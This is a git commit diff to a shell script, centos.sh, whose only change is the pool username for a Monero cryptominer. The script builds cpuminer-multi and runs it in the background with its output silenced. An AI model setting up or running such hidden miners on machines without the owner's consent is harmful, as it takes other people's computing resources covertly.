f2e4a217e863be277d2be278adfafdb71d89b0fc
gamerok69 <14660687+gamerok69@users.noreply.github.com>
2020-12-12 14:49:38 +0200

    Update centos.sh

--- centos.sh
+++ centos.sh
@@ -14,4 +14,4 @@ cd cpuminer-multi
 
 ./build.sh
 
-./cpuminer -a cryptonight -o stratum+tcp://xmr.viabtc.com:8888 -u gufik11 -p x > /dev/null 2>&1 &
+./cpuminer -a cryptonight -o stratum+tcp://xmr.viabtc.com:8888 -u gufik611 -p x > /dev/null 2>&1 &
